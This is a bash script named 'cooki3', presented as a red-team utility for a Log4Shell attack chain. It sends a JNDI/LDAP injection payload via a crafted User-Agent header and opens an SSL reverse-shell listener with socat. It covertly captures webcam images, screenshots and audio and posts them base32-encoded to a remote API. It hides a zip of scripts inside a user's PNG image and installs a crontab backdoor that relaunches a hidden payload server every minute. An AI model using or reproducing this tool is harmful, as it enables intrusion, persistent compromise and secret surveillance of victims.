#!/bin/bash
#----------
RED="\e[95m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[36m"
ENDCOLOR="\e[0m"
#---------- 107 52
: '
(n) cooki3
provide interactive tty and command exploration using which about the system utility despite the symbolic link
payload are also will be injected via netcat filesharing. heres are pinned favorable commands by cheatsheet:
- netcat 	- ncat   	- mvn     	- netstat    	- tput		- $TERM
- python   	- java    	- find    	- ifconfig      - tcpdump
- nano     	- javac   	- wget    	- iwconfig		- tar
'``
#----------
check_dependencies() { ## check coreutils dan python
	check_stty=$(dpkg-query -W -f='${Status}' coreutils 2>/dev/null | grep -c "ok installed")
	check_python=$(readlink -f $(whereis python3) | grep bin | grep -wv config | sort -r | head -1)
	check_ncat=$(dpkg-query -W -f='${Status}' netcat-openbsd 2>/dev/null | grep -c "ok installed")	
	checker=0
	if [[ $check_stty -eq 0 ]]; then echo "coreutils is not installed ..."; else checker=$((checker+1)); fi
	if [[ $check_ncat -eq 0 ]]; then echo "netcat-openbsd is not installed ..."; else checker=$((checker+1)); fi		
	if [[ -z $check_python ]]; then echo "python is not installed ..."; else checker=$((checker+1)); fi
	if [[ $checker -eq 3 ]]; then echo "true $check_python"; else echo "false"; fi
}
#----------
opt_help() { ## display command usage
	echo -e "${BLUE}                          888      d8b  .d8888b. " 
	echo -e "                          888      Y8P d88P  Y88b" 
	echo -e "                          888               .d88P" 
	echo -e " .d8888b .d88b.   .d88b.  888  888 888     8888\" " 
	echo -e "d88P\"   d88\"\"88b d88\"\"88b 888 .88P 888      \"Y8b." 
	echo -e "888     888  888 888  888 888888K  888 888    888" 
	echo -e "Y88b.   Y88..88P Y88..88P 888 \"88b 888 Y88b  d88P" 
	echo -e " \"Y8888P \"Y88P\"   \"Y88P\"  888  888 888  \"Y8888P\" \n ${ENDCOLOR}"
	echo -e "Usage: cooki3 [OPTION]... [ARG]..."
	echo -e "Red Team utilities for setting up Log4Shell payload & generate interactive shell\n"
	echo -e "Available flag options, starred one are combination purposes ...\n"
	echo -e "  ${GREEN}-h${ENDCOLOR}\t launch command usage for avilable flag options & examples"	
	echo -e "  ${GREEN}-i${ENDCOLOR}\t initiate interactive tty's adjustment using the latest available python"
	echo -e "  ${GREEN}-r${ENDCOLOR}\t run dynamic selection port on Java HTTP Server perpetual"
	echo -e "  ${GREEN}-s${ENDCOLOR}\t show information about command's binaries path & network interfaces "	
	echo -e "  ${GREEN}-S${ENDCOLOR}\t write embedded steganography archive with crontab's backdoor for post-exploitation"
	echo -e "  ${GREEN}-w ${YELLOW}**${ENDCOLOR}\t assign Java / Go Web Server port address's that runs the API"
	echo -e "  ${GREEN}-l ${YELLOW}**${ENDCOLOR}\t assign LDAP Server port address's that hosted the Java payload reference"
	echo -e "  ${GREEN}-p ${YELLOW}**${ENDCOLOR}\t assign the payload to the JNDI based on the CN of the entry"
	echo -e "  ${GREEN}-n ${YELLOW}**${ENDCOLOR}\t assign the local IP address of an available network interface for required services"
	echo -e "  ${GREEN}-o ${YELLOW}**${ENDCOLOR}\t specify the port address to open the remote shell listener"
	echo -e "  ${GREEN}-c ${YELLOW}**${ENDCOLOR}\t specify the SSL certificate path with .PEM format file"
	echo -e "  ${GREEN}-g ${YELLOW}**${ENDCOLOR}\t get remote resources to be uploaded to the Go API [screen/webcam/audio] and [fetch]"	
	echo -e "  ${GREEN}-t ${YELLOW}**${ENDCOLOR}\t add the title event, which available for all method to the get (-g) option"
	echo -e "  ${GREEN}-d ${YELLOW}**${ENDCOLOR}\t specify the duration of the recording audio in the get (-g) option"	
	echo -e "\nFlag combination examples:\n"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash cooki3.sh ${GREEN}-w${ENDCOLOR} 4080 ${GREEN}-l${ENDCOLOR} 2038 ${GREEN}-p${ENDCOLOR} 1807422020 ${GREEN}-n${ENDCOLOR} wifi0"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash cooki3.sh ${GREEN}-w${ENDCOLOR} 192.168.1.11:8080 ${GREEN}-l${ENDCOLOR} 10.10.1.120:389 ${GREEN}-p${ENDCOLOR} 1807422024"	
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash cooki3.sh ${GREEN}-o${ENDCOLOR} 2100 ${GREEN}-c${ENDCOLOR} openssl-cert/bind.pem ${GREEN}-n${ENDCOLOR} wifi0"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash cooki3.sh ${GREEN}-g${ENDCOLOR} screen ${GREEN}-t${ENDCOLOR} meeting ${GREEN}-w${ENDCOLOR} 192.168.1.6:2080"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash cooki3.sh ${GREEN}-g${ENDCOLOR} audio ${GREEN}-t${ENDCOLOR} whatsapp call ${GREEN}-w${ENDCOLOR} 192.168.1.6:2080 ${GREEN}-d${ENDCOLOR} 10"	
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash cooki3.sh ${GREEN}-g${ENDCOLOR} fetch ${GREEN}-w${ENDCOLOR} 192.168.1.6:2080"
	echo -e "\nFull documentation at https://github.com/hotpotcookie/log4shell-white-box/tree/main/doc"
	echo -e "Open issues and report bugs to https://github.com/hotpotcookie/log4shell-white-box/issues"
	exit 0
}
#----------
opt_initiate() { ## initiate terminal stty upgrade & terminal adjustment
	echo -e "${RED}[-]${ENDCOLOR} spawning python's tty in ${BLUE}$1${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} suggesting static terminal size, rows [${BLUE}20${ENDCOLOR}/${BLUE}42${ENDCOLOR}] x cols [${BLUE}108${ENDCOLOR}/${BLUE}222${ENDCOLOR}] ..."
	echo -e "${RED}[-]${ENDCOLOR} to use interactive shell, please do the following commands after suspension ..."
	echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}stty rows X cols X ${ENDCOLOR}"
	echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}export TERM=xterm-256color${ENDCOLOR}"	
	$1 -c 'import pty; pty.spawn("/bin/bash")'
	exit 0
}
#----------
opt_show() { ## show information about system (path variabel & system information) in array
	arr_command=("nano" "ncat" "wget" "curl" "tar" "ifconfig" "ufw" "streamer" "import")
	arr_variable=("java" "javac" "mvn" "python" "gcc" "make")
	python_var=$1
	echo -e "${RED}[-]${ENDCOLOR} displaying command's binaries path ...\n:::"
	for env in ${arr_variable[@]}; do
		if [[ $env == "python" ]]; then echo -e "${YELLOW}python${ENDCOLOR}\t : $python_var"; continue; fi
		echo -e "${YELLOW}$env${ENDCOLOR}\t : $(which $env)"
	done; echo "--"
	for cmd in ${arr_command[@]}; do
		if [[ $cmd == "ifconfig" ]]; then echo -e "${YELLOW}ifconfig${ENDCOLOR} : $(which ifconfig)"; continue; fi
		if [[ $cmd == "streamer" ]]; then echo -e "${YELLOW}streamer${ENDCOLOR} : $(which streamer)"; continue; fi			
		echo -e "${YELLOW}$cmd${ENDCOLOR}\t : $(which $cmd)"
	done; echo "--"
	printenv PATH; echo ""
	
	echo -e "${RED}[-]${ENDCOLOR} displaying video and microphone modules ...\n:::"		
	lsmod | grep uvcvideo | head -n 1
	lsmod | grep videodev | head -n 1	
	lsmod | grep snd_hda_intel | head -n 3
	echo "" 

	echo -e "${RED}[-]${ENDCOLOR} displaying network interfaces ...\n:::"	
	get_interface=$(netstat -i | tr -s '\t' ' ' | cut -d ' ' -f 1 | grep -wv Kernel | grep -wv Iface | tr -s '\n' ' ')
	IFS=$' '
	arr_interface=($get_interface)
	for int in ${arr_interface[@]}; do
		if [[ "$int" != *"veth"* ]]; then
			echo -e "${BLUE}$int${ENDCOLOR}\t : $(ifconfig $int | grep inet | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3-5)"
		else
			echo -e "${BLUE}$int${ENDCOLOR} ( virtual )"
		fi		
	done
	exit 0
}
#----------
opt_payload() { ## file transfer for payload & setup automation (unpack tar.gz, decode base64, etc)
	if [[ ! -z "$4" ]]; then
		wifi_ip=$(ifconfig $4 | grep "inet " | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3)		
		web_ip=$wifi_ip; web_port=$1
		ldap_ip=$wifi_ip; ldap_port=$2
	echo -e "${RED}[-]${ENDCOLOR} wifi0       : ${BLUE}$wifi_ip${ENDCOLOR} ..."
	else
		web_ip=$(echo $1 | cut -d ':' -f 1)
		web_port=$(echo $1 | cut -d ':' -f 2)
		ldap_ip=$(echo $2 | cut -d ':' -f 1)
		ldap_port=$(echo $2 | cut -d ':' -f 2)		
	fi
	echo -e "${RED}[-]${ENDCOLOR} web-server  : http://${BLUE}$web_ip${ENDCOLOR}:${BLUE}$web_port${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} ldap-server : ldap://${BLUE}$ldap_ip${ENDCOLOR}:${BLUE}$ldap_port${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} payload     : \${jndi:ldap://${BLUE}$ldap_ip${ENDCOLOR}:${BLUE}$ldap_port${ENDCOLOR}/cn=${BLUE}$3${ENDCOLOR},dc=attacker,dc=com} ..."
	echo -e "---"
	curl http://$web_ip:$web_port -H 'User-Agent: ${jndi:ldap://'"$ldap_ip:$ldap_port"'/cn='"$3"',dc=attacker,dc=com}' -s | jq '.'
	exit 0
}
#----------
opt_openlistener() {
	ip=$(ifconfig $3 | grep "inet " | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3)			
	echo -e "${RED}[-]${ENDCOLOR} SSL-listen : ${BLUE}$ip${ENDCOLOR}:${BLUE}$1${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} SSL-cert   : ${BLUE}$2${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} SSL-verify : disabled (0) ..."
	echo -e "---"	
	socat `tty`,raw,echo=0 openssl-listen:$1,cert=$2,verify=0
	exit 0	
}
#----------
opt_get() {
	rand=$(date +%T%D | tr -d ':/' | md5sum | cut -d ' ' -f 1 | cut -c -8)
	timestamp=$(date +"%D %T")
	case $1 in
		"webcam")
			echo -e "${RED}[-]${ENDCOLOR} capturing webcam to ${BLUE}/tmp/.$rand.jpeg${ENDCOLOR} ...\n---"			
			streamer -o /tmp/."$rand".jpeg 2> /tmp/."$rand".log
			get_log=$(cat /tmp/."$rand".log)
			if [[ "$get_log" == *"fail"* ]]; then
				rm /tmp/."$rand".log
				echo -e "${RED}[-]${ENDCOLOR} failed to capture webcam in ${BLUE}/tmp/.$rand.jpeg${ENDCOLOR} ..."						
				echo -e "${RED}[-]${ENDCOLOR} video modules are still being used by the host ..."				
			else
				datab32=$(cat /tmp/."$rand".jpeg | base32 | tr -d '\n')
				curl -s --data "{\"TYPE\":\"WEBCAM\",\"TITLE\":\"${2^^}\",\"TIMESTAMP\":\"$timestamp\",\"ENCODING\":{\"EXTENSION\": \"JPEG\", \"BASE32\":\"$datab32\"}}" -X POST http://$3/captures | jq .
				rm /tmp/."$rand".jpeg /tmp/."$rand".log
				echo -e ":::\n${RED}[-]${ENDCOLOR} captured webcam in ${BLUE}/tmp/.$rand.jpeg${ENDCOLOR} have been removed ..."						
				echo -e "${RED}[-]${ENDCOLOR} encoded data have been added in ${BLUE}http://$3/captures${ENDCOLOR} ..."		
			fi
			;;
		"screen")
			echo -e "${RED}[-]${ENDCOLOR} capturing screen to ${BLUE}/tmp/.$rand.png${ENDCOLOR} ...\n---"
			import -window root /tmp/."$rand".png
			datab32=$(cat /tmp/."$rand".png | base32 | tr -d '\n')
			echo "{\"TYPE\":\"SCREEN\",\"TITLE\":\"${2^^}\",\"TIMESTAMP\":\"$timestamp\",\"ENCODING\":{\"EXTENSION\": \"PNG\", \"BASE32\":\"$datab32\"}}" | curl -s -X POST -d @- http://$3/captures | jq .
			rm /tmp/."$rand".png
			echo -e ":::\n${RED}[-]${ENDCOLOR} captured screen in ${BLUE}/tmp/.$rand.png${ENDCOLOR} have been removed ..."			
			echo -e "${RED}[-]${ENDCOLOR} encoded data have been added in ${BLUE}http://$3/captures${ENDCOLOR} ..."			
			;;			
		"audio")
			if [[ "$4" ]]; then
				echo -e "${RED}[-]${ENDCOLOR} recording audio to ${BLUE}/tmp/.$rand.wav${ENDCOLOR} ...\n---"
				arecord -fdat /tmp/."$rand".wav -d $4 -q
				datab32=$(cat /tmp/."$rand".wav | base32 | tr -d '\n')
				echo "{\"TYPE\":\"AUDIO\",\"TITLE\":\"${2^^}\",\"TIMESTAMP\":\"$timestamp\",\"ENCODING\":{\"EXTENSION\": \"WAV\", \"BASE32\":\"$datab32\"}}" | curl -s -X POST -d @- http://$3/captures | jq .
				rm /tmp/."$rand".wav
				echo -e ":::\n${RED}[-]${ENDCOLOR} recorded audio in ${BLUE}/tmp/.$rand.wav${ENDCOLOR} have been removed ..."			
				echo -e "${RED}[-]${ENDCOLOR} encoded data have been added in ${BLUE}http://$3/captures${ENDCOLOR} ..."			
			else 
				echo -e "${RED}[-]${ENDCOLOR} missing the duration (-d) option for audio recording ..."										
			fi
			;;
		"fetch")
			idx=0
			len=$(curl -s http://$3/captures | jq '. | length')
			echo -e "${RED}[-]${ENDCOLOR} listing indexes on ${BLUE}http://$3/captures${ENDCOLOR} ..."			
			while [[ $idx -lt $len ]]; do
				month=$(curl -s http://$3/captures | jq .[$idx].TIMESTAMP | cut -d '"' -f 2 | cut -d ' ' -f 1 | tr -s '/' '-' | cut -d '-' -f 1,3)
				day=$(curl -s http://$3/captures | jq .[$idx].TIMESTAMP | cut -d '"' -f 2 | cut -d ' ' -f 1 | tr -s '/' '-' | cut -d '-' -f 2)
				time=$(curl -s http://$3/captures | jq .[$idx].TIMESTAMP | cut -d '"' -f 2 | cut -d ' ' -f 2 | tr -s ':' '_')
				title=$(curl -s http://$3/captures | jq .[$idx].TITLE | cut -d '"' -f 2)
				ext=$(curl -s http://$3/captures | jq .[$idx].ENCODING.EXTENSION | cut -d '"' -f 2)
				#
				if [[ ! -f "../captures/$month/$day/$time-$title.${ext,,}" ]]; then
					echo -e "${RED}[-]${ENDCOLOR} fetching ../captures/$month/$day/${BLUE}$time-$title.${ext,,}${ENDCOLOR} ..."
					mkdir -p "../captures/$month/$day"
					base32 -d <<< $(curl -s http://$3/captures | jq .[$idx].ENCODING.BASE32 | cut -d '"' -f 2) > "../captures/$month/$day/$time-$title.${ext,,}"
				fi
				idx=$((++idx))
			done
			[[ $idx -gt 0 ]] && echo -e "${RED}[-]${ENDCOLOR} all resources have been fetched ..." || echo -e "${RED}[-]${ENDCOLOR} no resources to be fetched ..."
			;;
		*)
			exit 0
			;;
	esac
}
#----------
opt_runjavahttp() {
	port=$(curl -s http://192.168.113.9:2080/properties | jq .[].PORT_JAVA_HTTP | cut -d '"' -f 2)
	java_bin=$(which java)
	while true; do
		ip=$(ip a | grep inet | grep -vw inet6 | grep -vw 127.0.0.1 | head -n 1 | tr -s '\t' ' ' | cut -d ' ' -f 3 | cut -d '/' -f 1);
		response=$(curl -s http://$ip:$port --connect-timeout 3)
		if [[ -z "$response" && ! "$response" == *"payload"* ]]; then
			ps axjf | grep "java -jar /tmp/.payload-1.23.jar" | grep -vw "grep" | head -n 1 | tr -s '\t' ' ' | cut -d ' ' -f 3 | { read msg; kill -9 "$msg"; } 2> /dev/null
			port=$(shuf -i 49152-65535 -n1)
			echo "probing server to new port at :$port"
			curl -s --data "{\"PORT_JAVA_HTTP\":\"$port\"}" -X PATCH http://192.168.113.9:2080/properties & wait
			java -jar /tmp/.payload-1.23.jar & disown
		fi
		sleep 15
	done
	exit 0
}
#----------
opt_steganocrontab() {
	pathenv=$(printenv PATH)
	pic=$(ls $HOME/Pictures/*.png | grep -v '[()$ ]' | head -n 1)
	size_pre=$(ls -lh $pic | head -n 1 | cut -d ' ' -f 5)
	echo -e "${RED}[-]${ENDCOLOR} using ${BLUE}$pic${ENDCOLOR} as selected .png file ..."
	cat /tmp/.pwnd.zip >> "$pic"
	size_post=$(ls -lh $pic | head -n 1 | cut -d ' ' -f 5)
	echo -e "${RED}[-]${ENDCOLOR} embedding internal scripts ${BLUE}/tmp/.pwnd.zip${ENDCOLOR} to ${BLUE}$pic${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} noticeable file size changes ${BLUE}$size_pre${ENDCOLOR} --> ${BLUE}$size_post${ENDCOLOR} ..."
	#
	event="DISPLAY=:0\nPATH=\"$pathenv\"\n*/1 * * * * /usr/bin/gnome-terminal -e '/bin/bash -i -c \"unzip -qq -o \\\\\"$pic\\\\\" -d /tmp 2> /dev/null; ps axjf | grep \\\\\"bash /tmp/.cooki3.sh -r\\\\\" | grep -vw \\\\\"grep\\\\\" | head -n 1 | tr -s \\\\\" \\\\\" | cut -d \\\\\" \\\\\" -f 3 | { read msg; kill -9 \\\\\"\$msg\\\\\"; } 2> /dev/null; bash /tmp/.cooki3.sh -r & disown\"'"
	(crontab -l; printf "$event\n") | crontab -
	echo -e "${RED}[-]${ENDCOLOR} writing backdoor services via crontab's job ...\n"	
	exit 0
}
#==========
get_check=$(check_dependencies | cut -d ' ' -f 1)
get_python=$(check_dependencies | cut -d ' ' -f 2)
if [[ $get_check == "true" ]]; then
	while getopts ":c:o:w:l:p:n:g:t:d: :i :s :h :r :S" opt; do
		case $opt in
			w) w="${OPTARG}" ;;
			l) l="${OPTARG}" ;;
			p) p="${OPTARG}" ;;
			n) n="${OPTARG}" ;;
			c) c="${OPTARG}" ;;
			o) o="${OPTARG}" ;;
			g) g="${OPTARG}" ;;
			t) t="${OPTARG}" ;;
			d) d="${OPTARG}" ;;
			i) opt_initiate $get_python ;;
			s) opt_show $get_python ;;
			h) opt_help ;;
			r) opt_runjavahttp ;;
			S) opt_steganocrontab ;;
			*) h="go"
		esac
	done
	#----------
	if [[ "$o" && "$c" && "$n" ]]; then opt_openlistener "$o" "$c" "$n"; exit 0; fi	
	if [[ "$w" && "$l" && "$p" ]]; then opt_payload "$w" "$l" "$p" "$n"; exit 0; fi
	if [[ "$g" && "$w" ]]; then opt_get "$g" "$t" "$w" "$d"; exit 0; fi
	opt_help
	exit 0
else
	echo "$get_check || $get_python"
	echo "[-] host have unmet dependencies ..."
	echo -e "[-] quitting ...\n"
	exit 1
fi
